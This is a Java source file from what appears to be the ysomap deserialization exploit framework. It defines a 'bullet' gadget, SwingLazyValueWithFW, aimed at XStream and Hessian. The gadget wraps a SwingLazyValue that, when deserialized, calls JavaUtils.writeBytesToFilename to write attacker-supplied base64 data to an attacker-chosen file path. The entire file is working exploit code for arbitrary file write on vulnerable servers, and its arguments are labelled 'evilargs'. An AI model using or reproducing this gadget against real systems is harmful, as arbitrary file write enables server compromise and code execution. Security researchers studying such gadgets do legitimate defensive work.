package ysomap.bullets.jdk;

import sun.swing.SwingLazyValue;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

import java.util.Base64;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
@Dependencies({"jdk"})
@Details("文件写入")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class SwingLazyValueWithFW extends AbstractBullet<SwingLazyValue> {

    @NotNull
    @Require(name = "filepath", detail = "like /tmp/ok.txt")
    public String filepath;

    @NotNull
    @Require(name = "data", detail = "base64 data")
    public String data;

    @Override
    public SwingLazyValue getObject() throws Exception {
        String classname = "com.sun.org.apache.xml.internal.security.utils.JavaUtils";
        String methodName = "writeBytesToFilename";
        byte[] bytes = Base64.getDecoder().decode(data);
        Object[] evilargs = new Object[]{filepath, bytes};
        return new SwingLazyValue(classname, methodName, evilargs);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new SwingLazyValueWithFW();
        bullet.set("filepath", args[0]);
        bullet.set("data", args[1]);
        return bullet;
    }
}
